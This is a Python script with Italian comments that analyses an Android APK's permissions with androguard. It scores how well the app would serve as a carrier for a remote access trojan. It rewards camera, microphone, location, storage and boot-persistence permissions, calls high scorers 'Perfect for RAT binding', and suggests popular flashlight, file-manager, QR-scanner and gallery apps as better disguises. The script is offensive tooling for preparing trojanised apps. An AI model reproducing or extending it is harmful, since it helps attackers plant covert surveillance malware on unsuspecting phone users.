#!/usr/bin/env python3
"""
🔍 Verifica Permessi APK
Controlla se un APK ha i permessi necessari per il RAT
"""

import sys
import os
from androguard.misc import AnalyzeAPK
from androguard.core.bytecodes import apk

def check_apk_permissions(apk_path):
    """Analizza i permessi di un APK"""
    
    if not os.path.exists(apk_path):
        print(f"❌ File APK non trovato: {apk_path}")
        return False
    
    print(f"🔍 Analyzing APK: {apk_path}")
    print("=" * 60)
    
    try:
        # Analizza APK
        a, d, dx = AnalyzeAPK(apk_path)
        
        # Info base APK
        print(f"📱 Package Name: {a.get_package()}")
        print(f"🏷️  App Name: {a.get_app_name()}")
        print(f"📊 Version: {a.get_androidversion_name()} (Code: {a.get_androidversion_code()})")
        print(f"🎯 Target SDK: {a.get_target_sdk_version()}")
        print(f"📏 Min SDK: {a.get_min_sdk_version()}")
        print()
        
        # Permessi necessari per RAT
        required_permissions = {
            "android.permission.INTERNET": "🌐 Internet access (CRITICAL)",
            "android.permission.ACCESS_NETWORK_STATE": "📡 Network state access",
            "android.permission.WRITE_EXTERNAL_STORAGE": "💾 Write to storage",
            "android.permission.READ_EXTERNAL_STORAGE": "📂 Read from storage", 
            "android.permission.ACCESS_FINE_LOCATION": "📍 GPS location access",
            "android.permission.ACCESS_COARSE_LOCATION": "📍 Network location access",
            "android.permission.CAMERA": "📷 Camera access",
            "android.permission.RECORD_AUDIO": "🎤 Microphone access",
            "android.permission.RECEIVE_BOOT_COMPLETED": "🔄 Boot receiver",
            "android.permission.WAKE_LOCK": "⚡ Keep device awake",
            "android.permission.ACCESS_WIFI_STATE": "📶 WiFi state access"
        }
        
        # Ottieni tutti i permessi dell'APK
        apk_permissions = a.get_permissions()
        
        print("🔐 PERMISSION ANALYSIS")
        print("=" * 60)
        
        critical_missing = []
        important_missing = []
        
        for perm, description in required_permissions.items():
            if perm in apk_permissions:
                print(f"✅ {description}")
            else:
                print(f"❌ {description}")
                if perm == "android.permission.INTERNET":
                    critical_missing.append(perm)
                else:
                    important_missing.append(perm)
        
        print()
        print("📋 SUMMARY")
        print("=" * 60)
        
        if not critical_missing:
            print("✅ INTERNET permission: GRANTED")
            print("   → APK can connect to RAT server")
        else:
            print("❌ INTERNET permission: MISSING")
            print("   → APK CANNOT connect to RAT server")
            print("   → This APK will NOT work for RAT!")
        
        if len(important_missing) == 0:
            print("✅ All important permissions: GRANTED")
            print("   → Full RAT functionality available")
        elif len(important_missing) <= 3:
            print(f"⚠️ Some permissions missing: {len(important_missing)}")
            print("   → Limited RAT functionality")
        else:
            print(f"❌ Many permissions missing: {len(important_missing)}")
            print("   → Very limited RAT functionality")
        
        # Verifica attività principali
        print()
        print("🎯 ACTIVITIES ANALYSIS")
        print("=" * 60)
        
        activities = a.get_activities()
        if activities:
            print(f"📱 Found {len(activities)} activities:")
            for activity in activities[:5]:  # Mostra prime 5
                print(f"   - {activity}")
            if len(activities) > 5:
                print(f"   ... and {len(activities) - 5} more")
        else:
            print("❌ No activities found")
        
        # Verifica servizi
        services = a.get_services()
        if services:
            print(f"⚙️ Found {len(services)} services:")
            for service in services[:3]:  # Mostra primi 3
                print(f"   - {service}")
        else:
            print("⚠️ No services found")
        
        # Verifica receivers
        receivers = a.get_receivers()
        if receivers:
            print(f"📡 Found {len(receivers)} receivers:")
            for receiver in receivers[:3]:  # Mostra primi 3
                print(f"   - {receiver}")
        else:
            print("⚠️ No broadcast receivers found")
        
        print()
        print("🎯 RAT COMPATIBILITY SCORE")
        print("=" * 60)
        
        score = 0
        max_score = 100
        
        # Internet permission (critical)
        if "android.permission.INTERNET" in apk_permissions:
            score += 50
            print("✅ Internet access: +50 points")
        else:
            print("❌ Internet access: +0 points (CRITICAL)")
        
        # Network state
        if "android.permission.ACCESS_NETWORK_STATE" in apk_permissions:
            score += 10
            print("✅ Network state: +10 points")
        
        # Storage permissions
        storage_perms = ["android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE"]
        storage_count = sum(1 for p in storage_perms if p in apk_permissions)
        score += storage_count * 5
        print(f"📂 Storage access: +{storage_count * 5} points")
        
        # Location permissions
        location_perms = ["android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_COARSE_LOCATION"]
        location_count = sum(1 for p in location_perms if p in apk_permissions)
        score += location_count * 5
        print(f"📍 Location access: +{location_count * 5} points")
        
        # Media permissions
        media_perms = ["android.permission.CAMERA", "android.permission.RECORD_AUDIO"]
        media_count = sum(1 for p in media_perms if p in apk_permissions)
        score += media_count * 5
        print(f"📷 Media access: +{media_count * 5} points")
        
        # Boot receiver
        if "android.permission.RECEIVE_BOOT_COMPLETED" in apk_permissions:
            score += 10
            print("✅ Boot persistence: +10 points")
        
        # Activities and services
        if len(activities) > 0:
            score += 5
        if len(services) > 0:
            score += 5
        
        print()
        print(f"🏆 FINAL SCORE: {score}/{max_score}")
        
        if score >= 80:
            print("🎉 EXCELLENT - Perfect for RAT binding!")
            recommendation = "HIGHLY RECOMMENDED"
        elif score >= 60:
            print("✅ GOOD - Suitable for RAT binding")
            recommendation = "RECOMMENDED"
        elif score >= 40:
            print("⚠️ FAIR - Limited RAT functionality")
            recommendation = "USE WITH CAUTION"
        elif score >= 20:
            print("❌ POOR - Very limited functionality")
            recommendation = "NOT RECOMMENDED"
        else:
            print("💀 TERRIBLE - Will not work for RAT")
            recommendation = "DO NOT USE"
        
        print(f"📝 Recommendation: {recommendation}")
        
        return score >= 50  # Almeno 50 punti per essere utilizzabile
        
    except Exception as e:
        print(f"❌ Error analyzing APK: {e}")
        return False

def suggest_better_apks():
    """Suggerisce APK migliori"""
    print("\n💡 SUGGESTED BETTER APKs")
    print("=" * 60)
    
    suggestions = [
        {
            "name": "Super-Bright LED Flashlight",
            "type": "Flashlight",
            "score": "95/100",
            "why": "Has camera, internet, storage permissions"
        },
        {
            "name": "File Manager +",
            "type": "File Manager", 
            "score": "90/100",
            "why": "Has all storage and network permissions"
        },
        {
            "name": "QR & Barcode Scanner",
            "type": "QR Scanner",
            "score": "85/100", 
            "why": "Has camera, internet permissions"
        },
        {
            "name": "Simple Gallery Pro",
            "type": "Gallery",
            "score": "80/100",
            "why": "Has storage, camera permissions"
        }
    ]
    
    for i, app in enumerate(suggestions, 1):
        print(f"{i}. {app['name']} ({app['type']})")
        print(f"   Score: {app['score']}")
        print(f"   Why: {app['why']}")
        print()

def main():
    if len(sys.argv) != 2:
        print("🔍 APK Permission Checker")
        print("Usage: python3 verifica_permessi_apk.py <path_to_apk>")
        print()
        print("Example:")
        print("  python3 verifica_permessi_apk.py calculator.apk")
        return
    
    apk_path = sys.argv[1]
    
    print("🔥 APK PERMISSION ANALYZER")
    print("=" * 60)
    
    is_suitable = check_apk_permissions(apk_path)
    
    if not is_suitable:
        suggest_better_apks()
    
    print("\n✅ Analysis completed!")

if __name__ == "__main__":
    main()